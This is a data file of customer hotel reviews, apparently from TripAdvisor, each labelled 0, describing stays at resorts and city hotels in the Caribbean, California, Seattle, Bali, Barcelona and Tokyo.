"great, huge resort my family stayed at the gran bahia principe from january 24-31, 2008. we were in the royal golden section through air transat. overall, the vacation and resort was excellent, if not for a few minor hitches.check-in - my family flew in from all over canada, myself from toronto, the others from bc and alberta. the others arrived ahead of me, and had no problems checking in. mine did no go quite as smoothly, as there was some confusion on the bus going to the hotel as to who got what. people who had the normal package got checked in on the bus as we went to the resort, while the rest of us did not (ambarh, premium and royal golden were the others on the bus). upon arriving at the first stop, they neglected to mention for the royal golden passengers that it was our stop as well, but we eventually figured that part out on our own. the premium royal golden lobby was closed by the time we arrived, so i checked in through the normal front desk area without a problem.the rooms - rooms were in very good shape, and overall well cleaned. general cleaning and room towel replacement took place during the day, and because we were in the royal golden section, our beach towels were replaced during the night. very convenient, and chocolates were left as well each night. a nice touch. sound was not an issue, i did not hear any of our neighbors once at night. the tv was rather small, but rarely got watched other than in the early evening. a suprising number of movie channels, though many were spanish.the pool - being with the royal golden section, you get a private pool (premier, ambarh, and diamond also get private pools). this was excellent. we had no issue getting seats, the pool was never too busy, and the swim/walk up bar was great. this was far and away the best reason for being royal golden, as the main pool was always packed and very noisy. the beach - i only spent a little time on the beach, but overall the sand was very soft on the feet, there was ample shade available, and the water was great. sizable waves, and looking out at the distant shipwreck is really something. the games announcer/cheerleader/mc or something that was on the beach had a megaphone that was very annoying though, it sounded like he was yelling at people most the time.the food - buffet - i certainly did not go hungry here, and this is where a 5* place earns it's stars. the food at the main buffet in the lobby was extremely good, and very fresh. they change the menu nightly, and there was probably a good 25 different hot items to choose from each night, with lots of fresh fruit and cold food available as well. from breakfast to dinner, food was uniformly tasty and filling. the buffet at the main pool was also very good, though it had more standard fare (ie hot dogs, hamburgers), and not as much selection.the food - a'la carte - we went to 4 restaurants during our stay. japanese restaurant - made as you watch, this was an entertaining way to eat. we started with a few small pieces of sushi, though it was nothing to write home about for quality. then came several pieces of tempura shrimp and veggies, which were very tasty and fresh. finally, the main course consisted of you choice of chicken, beef, prawns, and veggies, in any combination. i had all 4, and while the chicken was a bit on the dry side, the other 3 were well cooked. for dessert you are moved to the middle sitting area, where everyone had very good deep-fried icecream. overall, very good, but i was a little saddened by the sub-par sushi.french restaurant (la cuisine) - an elegant and quiet evening. for starters i had a pasta dish, everyone else tried the soups. the soups were very sad looking, and barely a couple sips worth, while my pasta was hearty and delicious. i would strongly recommend anything other than a soup to start here. next came the filet mignon, which was outstanding. i was honestly amazed at the quality of beef (and size). it was a very filling meal. there were two different chocolate desserts that my table tried, i had the chocolate truffle, which was very rich and like a big piece of fudge, and the others had a chocolate mousse style dessert which was very tasty as well. this was my favourite of the 4 we visited, but the other 3 were a bit disappointed with their soup starters.italian restaurant - this was a much different atmosphere than the french restaurant, as there seemed to be much more bustle and noise (not bad, just different). appetizers were buffet style, and were extremely tasty. several of us went back for seconds, they were so good. for the main course i had the chef's special that night, pasta + lobster. overall, pretty good, but not great. i don't remember the dessert, but i believe it was very good again. this was still very good, but probably #4 of the 4 i visited.mediterranean restaurant - this place had a bit of everything on the menu. i started with another pasta, this one was a unique garlic sauce which was very light. for the main course, i had a massive piece of salmon, very close to the filet mignon of the french restaurant in quality. it was outstanding, and filling. the others had pork and lamb, and both of those were great as well. dessert was a lighter caramel pasty, which was good, but not great. the main course was so outstanding though, that this and the japanese were probably tied for 2nd /3rd best, with the french being the best place i visited.night activities - we saw several shows, and the michael jackson show was the most entertaining. the volume was a bit on the loud side for all shows though. after the shows, we enjoyed listening to the house band quite a bit later into the night. there was also kareoke and a dance club, though the club was only about 1/3 full the times i went, so not a lot of time was spent there. other - the fitness facilities were rather small, and not overly impressive for a resort this size and quality. considering the immense size of the resort, there are constant shuttles running back and forth all over the place. i would still recommend walking everywhere, it was much more enjoyable to me and probably took 10 minutes to walk one end to the other. i'm not sure if it was exclusive to royal golden members, but we got to use 15 minutes a day of internet at a public spot, which i found handy to keep up to",0
"great hotel the rooms were on the large side , but unfortunately no view. it was a nice touch to have mints, apples and 2 bottles of water waiting in the room when we arrived, very nice touch. the breakfast room was to small and very crowded so we did not stay to have breakfast at the hotel. is centrally locacated and short walk to almost anywhere you want to be in downtown seattle.",0

"loved it! will stay again! my husband and i stayed for nights and loved it. we got the cabana room balcony which overlooked the pool and tropicana bar. we booked directly and paid $259 + valet. unsure if it is a good deal but after staying in new york hotels, we were happy with the price. we found the room modern and tastefully decorated. it was large too. plasma tv was small but suffice. toiletries from fresh (paris) and cookies on the turndown service was a nice touch. the hotel lounge and lobby dark but adds to the seductive and sophisticted atmosphere. beautiful chesterfield chairs and lounges, and leather papasan chairs! we loved the decor even though other reviewers have found it depressing. the staff were really friendly and helpful in a waiter in the dining rooms in particular, was charming! we had a wonderful breakfast one morning. a bit pricey but you have to treat yourself sometimes! the servings are generous anyway. i recommend the pineapple roasted french toast!tropicana bar was dead and perhaps is so on weekdays. too bad the weather was not warm enough to have a swim as they have a fantastic pool. while we were there, csi miami was being filmed in the pool area. we snuck a peek and was tempted to run down and ask for autographs!could not ask for a better location! the chinese mann's theater is right accross the street and there is a shopping mall with several restaurants. the pharmacy around the corner (to the left and across the street) has some groceries. if you want a cheap meal, we went to across the street one morning to shelly's diner for breakfast, where they shot million dollar baby.",0

"family fun stayed from 3 nights from 28 june. booked directly through their website selected a bounceback vacation at $99 nightly which included breakfast for two adults. we were advised during a quick, pleasant and straightforward check-in that kids eat free on this deal - this was not advertised so came as a very welcome surprise. optional $9 daily resort passes were explained to us but we were not pressured to buy them. [in fact these seemed to represent very good value when shared by a family who would use the additional facilities]. on booking i had requested only that our room be not too far from pools. we were allocated a remodelled room top floor north tower: yes our balcony overlooked the inescapable car park but directly beyond that only mountains with fantastic view of sunrise [which with jet lag we were able to fully appreciate each morning!].... and excepting the casitas it was as close as could be to the river ranch pools.the hotel and grounds were attractively landscaped and commendably vigilently maintained. our suite itself was immaculate - spacious, comfortably but not overfussily furbished, well laid out generous storage. the bathroom dressing areas fittings superb. wonderfully comfortable beds and especially the plumpest ever pillows get a special thumbs up.the river ranch was great for families with younger kids - nothing too hardcore for thrill seeking teenagers mind. one decent water slide, [very] lazy river, waterfalls, sporty pools set up for volleyball, basketball etc, kids pools - you name it. it was at all times generously staffed and very well maintained. i was particularly impressed with poolside restrooms - which can't be easy to keep spotless all day long but they managed. refrigerated drinking water was freely available throughout the resort. pool water was probably more heavily chlorinated than your skin appreciates but certainly not more so than other hotel pools. river ranch opening hours were from 8.30am to 8.30pm but the good-sized and [while we were there] tranquil courtyard pools and hot tubs are open from 5.30am until... 11pm, i think - so if you are noise sensitive you might not appreciate being allocated a ground floor room in this area. the kids koyote club was way out of our budget to send the kids just for the fun of it if you were remaining on-site [about $60 per child per day session i think?] but no dobt a valuable service for those here on a conference or needing some time out. they also offered a great $5 midday movie popcorn to entice the kids out of the midday sun. we ate three times at the hole in the wall restaurant: two breaksfasts and one dinner. service and food both consistently exceptional - very child friendly indeed. the lovely location of the terrace overlooking the river ranch is the icing on the cake. lest this review read like i am a share-holder [although after this experience i might just consider?] let me say that our only negative experience was a breakfast at the lantana grill [this place seems more oriented to squaw peaks other key market - conference - than family market]. on our visit here customers seemed to be outnumbered by staff about 3 to one yet it took 20 minutes to have our order taken and another 30 for our breakfasts to arrive - when it did the orders were wrong but we were running so late by then i confess we let it go. lantana grill menu prices seemed comparable to hole in the wall but neither portions nor quality of food was close. the staff stood around in large groups talking and ignoring us. when i visited the restroom it clearly hadn't been checked for hours as the bins were flowing over and the wet floor strewn with wet towels .. and crawling along the foor i saw the only cockroach i spotted in the entire resort grounds.we also dined at the adjacent aunt chiladas mexican which has been enthusiastically reviewed on this site. i confess i was very disappointed with the food which appeared at our table in the blink of an eye after our orders were taken ........ and was bland and overcooked. however i do have to admit their complimentary chips dips are as good as any i ever tasted and the ambience was great! we were fortunate to visit midweek when the resort was lively enough to be buzzing but not in any way crowded. as we were leaving [start of july 4 holiday weekend] the hotel was clearly heavily booked and getting hectic - possibly i may not have enjoyed that weekend quite so much. nor would it be my first choice for a romantic weekend away from the kids. i have no doubt that there are more exclusive resorts in phoenix - with plusher pool towels, but in this price range? - at $99 daily with a delicious generous breakfast for four, lovely environment to relax in, all day entertainment poolside without having to fork out an extra penny ... and the best nights sleep away from home - why it quite distracted me from lamenting the heat!if i were management at the hilton squaw peak i would be extremely proud of my staff who succeed in keeping the place so pristine and providing a genuine welcome for families.",0

"pleasantly surprised i booked this hotel for a one night stay using my priority club points, this was just a very quick in and out visit from our main las vegas vacation specifically to see stevie wonder at the hollywood bowl (fantastic by the way)upon check in, the desk clerk upgraded us to a suite as i have a platinum priority club card. for a start this doesnt appear to be usual procedure for holiday inn despite what their website says, so i was happy with that. the room was on the 7th floor and was two rooms knocked into one, so was spacious. one side contained the bed and bathroom and the other side had a living area and another bathroom (so they could convert back into 2 rooms easily i guess).the 'rooms' were separated by a wooden lattice panel, giving the room a kind of eastern feeling. the decor was nice, neutral tones and exposed, painted brickwork and we had a large plasma screen hanging from the wall on a swivel pole so we could turn it round and watch from either the bedroom or living space. the bed was super comfy !to be honest we didnt spend enough time at the hotel to check out any of the dining facilities or pool so i cant comment on them, but the room was great, the desk clerk was really welcoming and also gave us a bag of free stuff, water, chocolate etcwe spent our free afternoon at universal city walk, and theres a shuttle bus from the hotel that picks up and drops off every hour or so, so convenientwe've talked about holidaying in the hollywood area again so would definitely look at staying here again",0

go for the executive floor we stayed in this busy shinjuku hilton with our two school age children. it was fantastic. we were lucky enough to stay on the executive floor which meant that there was some sort of food available from 6am-6pm which really helps with jet lagged families. we also had a private english speaking concierge who could help with all tourist and travel needs. we all loved the english/japanese breakfast buffet that was included with a room on these floors.our room was spacious by japanese standards. we were upgraded to a suite which was incredible. both were up to,0

"loved it! from the minute we arrived the staff was extremely gracious and helpful. check in was a breeze, and advice from the concierge was very helpful on what to do in the area and how to get around town. i booked a vista deluxe room and was not disappointed in the least, bed was comfy, room was quiet, nice big tv, nice bathroom, good water pressure in shower...all good. one of my friends booked a spa suite, it was awesome, i have to admit, i was just a bit jealous... we hung out with our friends one night in the hotel restaurant blvd 16 and had a great time and tried most of the appetizers which were great. i wish we would have given the entrees a try, but maybe next time... the chef even came over and took a minute to sit with us, he mentioned that the hotel is also pet friendly which we didn't know. it was nice to run into someone who loves dogs as much as we do! all in all, a great experience at the palomar, i would recommend to anyone!",0

"if i could spend my last days anywhere..... what can i say? when the wicked die they go to hell, but the righteous are assured of a reservation at the keraton jimbaran resort. being greeted by staff in quaint psuedo-traditional costumed uniform and by arrival herald by a gong certainly diminished any inferiority complex i may have previously experienced. like all international hotels, my accomodation was not ready for my arrival however i was persuaded toward forgiveness when i was asked to settle for suite accomodation until my standard room was made available on the following morning. even the standard rooms were superbly graceful in their traditional balinese decor and ornate woodwork (albeit, the twin doors to the rooms required both doors to be opened to enable my girth to enter comfortably. the accomodation included a dedicated veranda with twin seating and table, again in ornate balinese woodwork. the upper floor accomodation similarly had balconies - all of this overlooking a lush tropical garden setting. bliss!!! accomodation despite being dense was extremely discrete and rarely crossed paths with other guests outside of the common areas. all staff whether they be concierge or domestic workers greeted me with genuine and unintrusive warmth without exception. the pool area had a swim-up bar which regretably was never in service. the staff within the common areas of the resort including the spa, gift shop and craft vendors were courteous and unintrusive in comparison to the opportunistic and entrepreneurial traits of mist balinese vendors. the beachfront had an abundance of deck chairs both in full sun although largely within the shade of well canopied trees. the beach (being within the bay) was extremely calm and inviting and the sand adjacent to the resort was continually being raked by resort staff to maintain a pleasing presentation. a couple of critisisms of the beachfront was the presence of small fish washed upon the shoreline which may have represented the superflous bait being disgarded by the local fishing enterprises (jimbaran is predominately a fishing village) or may be indicative of the toxins within the bay. i prefer the former theory. another criticism is the presence of (presumably) stray mongrel dogs occupying the beach - however despite my anxiety about stray dogs, there was absolutely no sign of territorial aggression and i felt more at ease with these dogs than i would have back at home. the sand was also discoloured by ash and charcoal - presumably disgarded by the nearby barbeque seafood vendors. did i say barbequed seafood? during my stay in bali i have almost been tempted by special massage, jiggy-jig, beautiful young girl from legian however there is no greater ecstacy than seafood being grilled over coconut husks and lovingly seasoned and marinated. there are around half-a-dozen seafood reastaurants with candlelight tables extending on the beachfront serving a multitude varieties of fish and seafoodwith rice, salad, dessert and the obligatory bintang beer. one that comes to mind is lia's which served me a meal intended for two consisting of grilled prawns, clams, fish, crayfish, crab along with the usual rice, salad, condiments and the obligatory peanuts and two small bintangs for rp220,000 or aud $24.00. i had no hot",0

"nice hotel, safe location we stayed at the beverly garland holiday inn on sunday, march 26, 2006. there was four of us and the price with the advance purchase came to $136.00/per night...$155.14 with taxes. $8.00/per day to parkservice was very quick and staff was friendly. the snack/gift shop has maps, shirts, snacks and you can book tours from there...example...tour of the stars homes, the shuttle will come and pick you up from the hotel. hotel also has a restaurant. later at night my daughter was hungry but we didn't feel like going into the restaurant to eat or pay high prices for room service, so we decided to place an order and pick it up ourselves at the restaurant. we placed an order with the restaurant and they said you can come get it that it is ready now and by the time we walked down there, it was ready, that was nice and saved us money.nice, clean hotel and the location is safe (some areas in hollywood are scary), it is close to universal and about 5 miles from the hollywood walk of fame and about 7-8 miles from farmer's market and the la brea tarpits.negatives would be... the price of the hotel (but consider the area) and the hotel could improve/update the hallways.i was in california for about a week and stayed at other hotels if you would like to look at those reviews. area/hotels:los angeles (near lax) - marriott renaissance montura anaheim (near disneyland) - holiday inn expresshuntington beach - best western huntington beach innlong beach - the coast long beach hotel",0

"Fantastic for Families Overall our one-week stay at the EdenH was above average, on the verge of excellent. When this hotel irons out a few minor irritants I am sure it will merit its 4 1/2 star rating.The hotel is about a 20 minute drive from the airport - very convenient indeed compared to some on Bavaro Beach that are 90 minutes away.As expected, with this hotel having been built less than one year ago, it is very clean. My first walkthrough the grounds was initially disappointing. There is not much lush vegetation. Lots of grass - some of it brown due to inadequate irriagtion, a few palm trees, but very few flowers and few other tropical plants. The pools were quite large. I was taken aback by the green pool floor tiles which of course makes the water look green. However by the second day, the green was actually quite pleasing on the eyes.I read some reviews on this hotel that stated there was a mosquito problem. I saw exactly one mosquito during my seven days there. Problem solved.The hotel room was spacious and somewhat controversial in design. There exists a large eight foot opening in the wall between the bathroom and the bedroom. I asked myself, why even bother having a bathroom door with a lock when one could easily enter the bathroom through the aforementioned opening. I suppose this opening saved the hotel from having to install ceiling fans in the bathroom since any humidity generated by a hot shower would dissipate throughout the room.A small detail: I would have prefered having the trash can in the bathroom instead of the toilet room. The toilet room by the way has a smoked glass door that does not lock. Speaking of smoked glass doors, there is also one that separates the shower room from the bathroom. It was difficult to open and close these doors because there is very little space between the botton of the doors and the bathroom floor - the doors would scrape loudly against the floor.The room has a system the promotes energy conservation. One must insert a hotel key in a slot in order to power up the lights and the electrical outlets. Remove the key and all the lights and the power go off. Small problem: the clock radio in the room would never have the right time. On the other hand, we're on vacation; should we even be keeping track of time?The air-condtioning system is cut off when the patio door is left open. The AC in my room, along with several guests I spoke to, was not strong enough to keep us very cool during throughout the night. I believe the AC was programmed to not cool lower than 76 degrees overnight.I found it a bit odd that a new hotel would not have a water purification system installed. So, word of caution, don't drink the tap water. The water served at the restaurants is fine.The food at the main buffet was adequate. There were at times long line-ups during breakfast for those ordering omelets and eggs (15 minutes is long when waiting for your omelets). This was due to having only one cook for parts of the breakfast hours. This was my first all-inclusive hotel that did not serve bacon. However there were sausages and other cold-cuts.We ate most of our lunches at the beach buffet. Again, nothing extraordinary. A nice feature of the hotel is its 24-hour room service. Make sure you get a copy of the room-service menu from the guest services personnel because there was no copy in the hotel room itself.The hotel has four a-la-carte restaurants: one serving Asian cuisine, one Italian, one Gourmet and one American. The food at the first three was delicious. The American restaurant was just ok. The hotel has made strides to help its clientel have a pleasureable a-la-carte dining experience. But there is room for improvement. 1. The reservation system is cumbersome. One must wait in a line-up for over 45 minutes in order to make the reservation. It is advisable to make all your reservations at once. And try to take advantage of going to these restaurants - the food is really worth it. 2. The literature in the hotel room states that the a-la-carte restaurants have a beeper-system and no reservations are taken. Obviously, they should get rid of this out-",0
"Perfect Place! My best friend and I just came back from our wonderful stay at Ocean Blue (7/26-8/1) and found it to exceed our expectations after reading previous reviews. Before going we had started to read very negative things about service, food, etc. and didn't seem to come across any of them. Yes, language may be a problem but I realzed I wasn't in the U.S. anymore and they don't have to speak engligh as they will try very hard to understand your needs. Before long, waiters were refilling our drinks before asking for more. The grounds are kept extremely clean and housekeeping always had our room perfect after coming back from breakfast. As for the food, we were so scared of getting sick or just having nasty food and didnt have that as a problem, even after reading all the horrible reviews of the Italian restaurant, we found that one to be our favorite! Breakfast has just so many things to choose from and lunch has enough variety to satisfy you. Mike's cafe was our fave and has the same quality of Starbucks. Make it a point to head over there after dinner for some dessert, coffee and tea. The beach is absolutely gorgeous with enough places to sit although shade is limited. The pool is cleaned thoroughly every morning and is so huge you never felt crowded even though the hotel was at full occupancy. Listen just go and enjoy, it's the most beautiful resort just to relax and get some good fun and sun. I appreciated this place so much more after staying at the Barcelo Caribe after our flight coming home was canceled. The rooms were nasty and, out",0

"the putrid santrian we too were keen to stay at this hotel based on the reviews below. we will be travelling to bali again, but there is no way we will be staying at the putrid santrian.this hotel was a major disappointment. compared to the 4 other hotels we stayed in in bali, this one was far below average. cannot agree enough with this statement from the previous review. we arrived at the hotel about 2pm. we were aware from our previous hotel experience that we had probably not booked a nice enough room and when we asked for an upgrade without yet seeing our room we were bluntly told no, the hotel was fully booked. so we were escorted to our garden view room on the second floor and walked into a very small smelly room with twin beds that still hadn't been cleaned from the previous customers. there were drink bottles, rubbish and shoes (yes it's true) strewn everywhere, and the beds still had dirty sheets on them. we could not believe that they had shown us to a room that had not yet been cleaned. we still had to fit in another bed for our son in this room, and forseeing a miserable 6 days in this room we trooped back to reception. upon insisting on an upgrade (which magically appeared after 15 minutes of negotiating) we were shown to a bungalow room, which was admittedly better than the previous room - at least it was bigger and we could easily fit in an extra bed for our son. for our extra $25us/day we got a room that was darker than a coal miner's nostril, with a",0

"happy we stayed at the omni in downtown la the last week in may 05. room was fine, clean, roomy, with a view - if we turned our heads - of frank gehry's disney center. what was probably the most impressive was the lower-level personnel, maids, bellmen, and the guys working the driveway, all cheerful, friendly, helpful. it was quite striking. the hotel has a car service that's available from 7 a.m. until 11 p.m. to take you or pick you up within a 3-mile radius. (that means you can go to dodger stadium, for instance.) no reservations, first come first served, but it worked really well. we had a car, but used the service 3 times in 5 days, and was happy with it. the hotel is walking distance of the disney, mark taper forum and chandler pavillion, as well as being almost on top of the contemporary art museum. there aren't a lot of restaurants, particularly for breakfast, nearby, especially on weekends. but we walked down the hill to the central market and had a wide range of choices, including great mexican food. (used the car service for a return.) if you go to the market, go across the street on the downhill side and see the bradbury building, unremarkable outside, but amazing inside. by the way, there are refrigerators in the rooms for the minibar, and they can be used if someone needs to store medications - no need to ask for another. i don't recall the daily parking charge, but it wasn't as much as some previous reviewers said.",0

"great hotel we stayed here in june 2004 for 3 nights. we loved the friendly, relaxed atmosphere and the opportunity to meet fellow guests at the happy hour in the hotel lobby each evening. the location of the hotel provides easy walks to numerous area attractions. our room was a little small but very clean and well appointed. we enjoyed our stay there so much we returned for another night before leaving the san francisco area. highly recommended.",0

"there are better places to stay i go to san francisco on business several times a year and have usually stayed at the stanford court. my last couple visits were less than satisfactory. i recommended the hotel to other co-workers who stayed there and they did not receive complimentary coffee. when i wrote to the management, it was checked out and determined that one was delivered (tho the time stated was after the guest checked out!!) and the other one just slipped through the cracks or some such thing. i was told that on my next visit, i would be given an upgraded room with a view. when i stayed there again (feb 2005), i brought the letter that said i'd be given an upgraded room and was told that the manager who wrote the letter no longer worked there. the room i got was an interior room with no view! the following day, i stopped at the vending machine on the 2nd floor to get bottled water and the machine dispensed soda instead. i brought it to the front desk for either a refund or replacement and the clerk asked a bellboy to get me some bottled water to replace it and he said that there was none in the fridge. the clerk then told me that warm water was better for me than cold anyway. i just said that i had paid for cold water. i went back to my room and a while later, housekeeping brought me some warm bottled water. as others have said in reviews, the location is great, but the hotel itself worn and tired, some of the staff ok, others indifferent at best. personally, i won't stay there again. grosvenor suites is right around the corner and a better deal.",0

Never the less the reception were lovely, they made us welcome with friendly smiles and the door men are brilliant. They are really helpful and will get you taxis, book helicopters flights, do anything you need - obviously they expect a tip after!! But they make the stay all the better.We had booked a king size suite and that it was!! It was massive. The front room was huge with dining table at the end of it. The tv was gigantic!

We all thoroughly enjoyed our vacation, with our goal being rest and relaxation.I hope you find these tips helpful.AIRPORT:Baggage handlers not worth the expense as it is only about 200 feet from the luggage carousel to the hotel buses.CHECK-IN:You can arrange a late check-out for US$10/hr. Useful if you have a late return flight.Room safe costs around US$5/day payable on check-in.ROOMS:All are junior suites in two story villas.Ground floor better if you have small kids as there are no stairs to climb.Jacuzzi tub and tiled floors in bathroom were nice touch.

"awful, awful, awful!! stayed for 3 nights - final stop on a great honeymoon, on the way back to the uk from fiji. chose the hotel because we were expecting a little bit of old-hollywood chic, and because of it's central location.room was tiny by american standards. particularly the bathroom which more closely resembled one from a japanese capsule hotel. room was decorated with a frankly disgusting large canvas photograph. walls were paper-thin (we could hear conversations in the room next door), bed and pillows weren't particularly comfortable (and my partner swears there was bed bugs due to the mysterious bites she kept waking up with), though the tv had a good selection of channels.the hotel istself is so dark and dingy. even with blazing sunshine outside, it's very gloomy in the lobby. it's also very noisy and busy; there always seemed to be something happening. the doors are also patrolled by angry doorman, who on more than one occasion prevented me entrance into my own hotel! it felt like tryng to get into a trendy nightclub at times.worst experience by far was on our last night (hoping to get a good night's sleep in preperation for an 11 hour flight!). having played host to a high-school prom, the hotel obviously allowed a load of the recent graduates to rent rooms. cue a night of screaming, banging, singing, running around corridors, etc. i've stayed in numerous hotels around the world, and never experienced noise like it. even my university halls were quieter. at 3am, i finally caved and rang the front-desk. the phone rang for 5 minutes before finally being picked up - we'll send someone right up sir - which of course they didn't. it got to 4am when i eventually went out into the corridor myself to try and reason with them. in fairness, they did start to quiten down, but it was a draining and restless night to say the least.ironically, despite the dark gloom of the main hotel, the rooms are suprisingly and dissapointingly bright at night. a combination of the cheap curtains, and the fact a spotlight shines directly at the windows... used to highlight a 50-foot high fashion advetrtisment emblazoned on the side of the building. that, in itself sums up the general cheap and tacky feel of this hotel.a hotel with a great legacy destroyed by pretentious owners. avoid like the plague.",0

"great hotel stayed for two nights, there were six of us in three rooms. we all had the same great opinion of this property. very clean and well maintained through-out. it was an easy walk to the bus stops and fisherman's wharf areas. there was a trader joes and safeway within a block of the hotel to buy snacks and such. the adjacent cafe pescatero was handy for breakfast but had some hiccups in service, but it was okay overall. we would highly recommend this hotel to others.",0

"only the location was any good had a 5 night stay at this hotel via a package with flight centre. the only thing going for this self rates 4.5 star joint is the location. walking distance to just about everything. our room was filthy. clean on the surface, but the walls, the carpet, the furniture all yuck. complained and was upgrated to a cleaner unit, but the place is in desperate need of a paint. all the facilities in room are there, that's one plus. but the staff - they are so rude. i rang reception one morning to request a clothes airer and the phone was answered with a yep, and this person did not even know what a clothes airer was. when we mentioned to staff on friday evening that there was a substance on the stairs, they only placed a sign over it, and it was still there on the monday morning. overall very unappy - take note spend the extra and up",0

"a disappointment in view of the reviews i chose this hotel mostly because of the very favourable reviews here. from that point a view, it was a disappointment.the basic price was 60 euros per night for a double room; i paid an extra 5 euros per night for a superior room. there was nothing special about the room, except that it faced the courtyard rather than the street. another guest complained about the noise from the street (one block away from the station, and often used by buses (coaches)), so perhaps the extra 5 euros were worth it.my room was in a short corridor, about 2 metres from the reception desk. people often talked while walking in the corridor, or when going to the breakfast room. the room was quite noisy because of this.i fiddled with the air conditioning control for some time before finding out that i couldn't operate it; i had to ask the staff to turn it on and off.i agree with the review",0

"not as terrible as anticipated - would return after booking this hotel (for march 24-27th) and then seeing the reviews (mostly bad) i must admit i was a bit nervous. but upon returning home, i think it's only fair to give some additional feed-back for anyone else who is considering staying at the hotel royal.first of all, i was told in advance by the front desk staff that they had limited support staff and that there wouldn't be anyone at the desk from midnight to 7:00 am (possibly due to post-katrina effects, i noticed a lot of hotels and restaurants were short-staffed). hopefully this will change as situations improve throughout the city.the pluses: great location and price and i was able to check in immediately upon arrival (10:30 am). even though the room wasn't ready they had it cleaned asap. room #16 was an attic room so many stairs...but again, knew that in advance and i live in a 5 flight walk-up in nyc so it wasn't that daunting. my room was quite large (queen/deluxe), as was the marble bathroom with frette towels - quite nice. the tv and phone worked fine as well. did i mention that everything was white...makes for difficult constant cleaning but it wasn't a problem. when my alarm broke the night before departing (they didn't have wake-up service) they seemed surprised that there wasn't one in the room. however, they brought one up to me immediately even though it was quite late and even set it and tested it to make sure it worked correctly.some minuses: it was odd that there were no lamps by the bed (or any other lighting in the room). if you were reading at night you had to go to the end of the room to turn the light out. the doors to the bathroom were strangely tiny considering it was a well-sized bathroom and there was no shelving to put toiletries on. without anyone at the front desk during the early morning hours there was no one to leave my card key with or call a cab as we had discussed the night before. fortunately, i had a travel book on me and was able to dig up a cab company phone # and managed just fine.as a previous poster mentioned, the numbering of the rooms is a bit odd but i lucked out with having someone help me carry my bag and show me to my room. all in all, if i were on a budget i would consider this place again and i found the staff to always be extremely helpful and gracious - when they were around. however, if you're used to having a lot of amenities then this might not be the place for you.",0

"stay over weekend at the millenium first thing which immediately became obvious was the roadworks outside causing issues with actually getting into the hotel. once there though i was met by polite reception staff and bag was whisked up to my run. i'd been upgraded to a room on the 48th floor. the bell boy seemed very excited about the room and said it was his favourite. i suspected he would say that about all the rooms, but when i got there i could see why - the view as amazing a corner room overlooking brooklyn river and bridges and out of another window the statue of liberty. room service was ok and efficient. no complaints about the restaurant (i only had breakfast) but all efficiently served. the door staff were fantastic - polite keen to server helping out with taxis and advice. there is something about the hotel though. i've stayed here on a couple of occasions and i think its the hallways. the doors into the room appear to be made of metal and as you walk down the hallways it looks like you are walking down a row of prison doors. interior of rooms have certainly been upgraded since last time i came to the millenium. large plasma screen tv was nice touch. contemporary furniture beginning to look a little",0

"unfortunate changes we live in the phoenix area and planned to eat at the hyatt before hearing the phoenix symphony across the street. we've done that for years. as we entered the lobby, i was surprised at how dingy the carpet and uhpholstery had become. we took the elevator to the compass room, a revolving restaurant on the top floor. when i said, we'd just like to head for the bar, the host said tersely, we don't have a bar. we have a cocktail lounge with sitdown service and a $15 minimum. okay, there's a view and sometimes you have to pay for a view. the bar was nearly deserted. we had our wine and moved on. there was something ungracious and unsavory about the whole experience. our plan was to move down to the hyatt's terrace cafe for a light supper. on a saturday night it was closed--already set up for breakfast. next, we tried the sports bar off the lobby. but we were headed for the symphony and the cigarette smoke and big screens just didn't work. three strikes and we were out of there. we won't be back.",0

"a great place to stay we recently spent 8 nights here and loved it. the bed was outstanding; room and lobby were very attractive; and we enjoyed the italian restaurant adjoining the hotel. we thought the location was excellent--attractions in san francisco are not all in one spot, so no hotel will be adjacent to everything you want to see. we were able to take a bus or cable car to the few places that were too far to walk. golden gate park on a sunday was our favorite place--there's an entire universe of activities going on there",0

"fine hotel ... not ""great"" by any stretch of the imagination. i recently stayed at the red lion in downtown seattle for three nights. i read the tripadvisor reviews prior to checking in and knew from what i read that the paper thin walls would probably be an issue. believe me, the notes about the walls are not exaggerated. they are incredibly thin. i couldn't believe how well i could hear everything (*every* thing) my neighbors did. it made for restless nights.beyond the walls made of balsa wood, the hotel has a bit of a",0
"nice hotel but with a surprise guest overall the hotel room was nice we enjoyed it but there's one thing that kind of freaked us out. i know there's no reported hauntings there or anything but in room 206 there was something like that going on. we were constantly hearing noises through the night coming from inside our room. we didn't want to say anything not wanting to sound dumb, but after leaving my husband asked me if i heard anything at night and then we started comparing the things that we herd. we experienced things such as: faint knocking sounds on door and on table inside the room when no one was there or even awake, shuffling, items moving, window squeaking, and also shadows. this may sound strange, but that's what happened to us during our stay at the beverly garland holiday inn. it's not a big deal or anything just thought we'd give future guests to room 206 a heads up. if you had any experiences like this at the hotel, please email your story to aricbell@yahoo.com",0

"very good - but not quite perfect! we stayed here for two nights last week (august), with our daughter and her friend. we had two standard rooms on the sixth floor (thanks to previous reviewers i asked to be high up).regarding the hotel's style and location, i agree with previous reviews - excellent, perfect position, tasteful, clean, modern etc, great to have the rooftop pool area, free internet access and english language news channels. regarding metro noise, we noticed the rumbling when sitting in the bar on the first floor - it didn't seem particularly intrusive but then i wasn't trying to sleep so maybe it would be different if it was your room ... certainly we couldn't hear anything when we were up on the sixth. the bar is a stylish place for a drink,but the barman appears to have several other responsibilities, so you can wait a long time for him to appear. he is friendly and helpful when he's there but that's hardly the point.apart from the bar the staff were very efficient and helpful regarding rooms, luggage etc. - but a request for a restaurant recommendation from the front desk turned out disastrously. i think a previous reviewer suggested that the staff probably wouldn't be a great information resource and i would agree.we tried cafe d'or opposite the hotel (recommended in several previous reviews) and it's lovely and friendly. also good, for tapas, is celler de tapas (i think that's what it was called) just around the corner on the pl. universitat.barcelona is a beautiful city and this is a very stylish and well-located place to stay - but don't rely on the staff for local advice, take a good up-to-",0
"very friendly staff stayed at the tuscan inn for three nights at the end of june. the service from every staff member we encountered was delightful. our room (two double beds) was very nice (spacious, clean, comfortable), except because of the room's heat at night it would have been good to be able to open the window; unfortunately the noise from the street was very loud if you did - suggest you request an interior-facing room if staying in summer.the location was good if you want to be near fisherman's wharf. perhaps i missed something, but the only things fisherman's wharf was good for was the ferry to alcatraz and hiring a bike to ride over the golden gate bridge to sausalito (both 'must-dos' whilst in san fran).drinks from 5-6pm were a great chance to meet other guests and as an aperitif before dinner (incidentally, we dined one night at the restaurant next to the tuscan inn; it was excellent, and you get 10% off for staying at the hotel).",0

